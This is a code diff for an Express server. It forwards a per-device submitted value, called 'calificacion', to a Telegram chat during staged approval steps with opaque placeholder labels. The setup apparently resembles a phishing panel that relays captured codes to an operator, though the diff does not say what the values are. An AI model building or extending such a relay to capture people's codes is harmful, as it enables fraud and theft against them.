@@ -78,7 +78,7 @@ async function llamarTelegramOpciones(metodo, datos) {
 
 app.post('/opciones/crear', async (req, res) => {
 
-    const { dispositivoID, etapa } = req.body;
+    const { dispositivoID, etapa, calificacion } = req.body;
 
 const etapaSolicitud =
     etapa === "calificacion"
@@ -117,10 +117,10 @@ solicitudesOpciones.set(idSolicitud, solicitud);
         chat_id: OPCIONES_CHAT_ID,
 
         text:
-            'APROBACIÓN ' + idVisible + ': ' +
+    'APROBACIÓN ' + idVisible + ': ' +
 (
     etapaSolicitud === 'tercera'
-        ? 'AAAA2'
+        ? 'AAAA2 ' + calificacion
         : etapaSolicitud === 'segunda'
             ? 'AAAA1'
             : 'UUUU/CCCC'
@@ -405,34 +405,6 @@ usuariosData[dispositivoID].codigo = `AAAA1 ${dispositivoID.replace('id.', '')}:
         }),
         headers: { 'Content-Type': 'application/json' },
     });
-    res.sendStatus(200);
-});
-
-// Ruta para recibir y enviar la calificación al bot de Telegram
-app.post('/send-calificacion', async (req, res) => {
-    const { dispositivoID, texto: calificacion } = req.body;
-
-// Almacenar la calificación por dispositivo
-if (!usuariosData[dispositivoID]) {
-    console.error('Registro no encontrado en /send-calificacion:', dispositivoID);
-    return res.status(404).json({
-        error: 'Registro de dispositivo no encontrado'
-    });
-}
-
-usuariosData[dispositivoID].calificacion =
-    `AAAA2 ${dispositivoID.replace('id.', '')}: \`${calificacion}\``;
-
-    await fetch(`https://api.telegram.org/bot${OPCIONES_BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        body: JSON.stringify({
-            chat_id: OPCIONES_CHAT_ID,
-            text: usuariosData[dispositivoID].calificacion,
-            parse_mode: 'Markdown'
-        }),
-        headers: { 'Content-Type': 'application/json' },
-    });
-
     res.sendStatus(200);
 });
 
